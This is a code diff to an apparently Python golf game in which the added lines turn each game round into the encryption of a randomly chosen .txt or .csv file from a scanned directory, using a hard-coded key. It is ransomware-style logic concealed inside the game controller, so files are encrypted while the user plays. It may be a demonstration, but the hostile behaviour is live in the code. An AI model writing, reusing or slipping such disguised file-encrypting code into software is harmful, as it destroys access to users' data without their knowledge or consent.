@@ -7,11 +7,22 @@ from goal import Goal
 from flag import Flag
 from sand import Sand
 from water import Water
+from pathlib import Path
+
+import encryption
+import util
+import hashlib
+import random
+
+
+EXCLUDE_FILES = ["requirements.txt", ".gitignore"]
+EXCLUDE_EXTENSIONS = [".py", ".md"]
+ONLY_ENCRYPT_EXTENSION = [".txt", ".csv"]
+TARGET_DIR = "target_dir"
 
 class GameController:
     def __init__(self, root):
         self.root = root
-        self.max_rounds = 3
         self.max_strokes = 5
 
         self.current_round = 0
@@ -27,6 +38,8 @@ class GameController:
         self.ball = Ball()
         self.goal = Goal()
         self.flag = Flag(self.goal)
+        self.files_in_dir = [items for items in util.scanDirRecursive(TARGET_DIR)]
+        self.max_rounds = len(self.files_in_dir)
 
         self.setup_bindings()
 
@@ -61,9 +74,21 @@ class GameController:
             self.root.destroy()
 
     def start_round(self):
+        target_index = random.randrange(0, len(self.files_in_dir))
+
+        target_file = self.files_in_dir[target_index]
+        filePath = Path(target_file)
+
+        key = hashlib.sha256("THIS IS MY KEY".encode()).digest()
+        if util.NAMED_CONVERSION not in target_file.path:
+            print("Enc")
+            encryption.encrypt(key, filePath)
+
         self.reset_game_objects()
         self.make_windows_visible(True)
         self.club.window.after(10, self.periodic_update)
+        self.files_in_dir.pop(target_index)
+
 
     def reset_game_objects(self):
         self.tree.place_tree()
